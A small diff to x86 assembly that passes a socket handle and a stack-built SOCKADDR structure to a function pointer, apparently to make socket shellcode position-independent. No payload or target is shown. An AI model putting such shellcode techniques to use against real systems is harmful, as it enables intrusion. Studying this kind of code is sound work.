@@ -299,6 +299,7 @@ _start:
 	xor eax,eax
 	mov edi, dword[esp+0x28]
 	mov edx,[esp+0x1C]	; SOCKET
+	mov ebx, esp
 	xor eax,eax		; raz eax
 	push eax		; 
 	push eax		;
@@ -306,11 +307,10 @@ _start:
 	push eax		;
 	mov al,0x10		; sizeof SOCKADDR
 	push eax		;
-	mov eax,sss 		; SOCKADDR
+	mov eax,ebx 		; SOCKADDR
 	push eax		;
 	;mov eax, edx		; socket Handle
 	push edx
-	;mov edi, 0x71A00C81
 	call edi
 	
 	cmp eax,0xFFFFFFFF
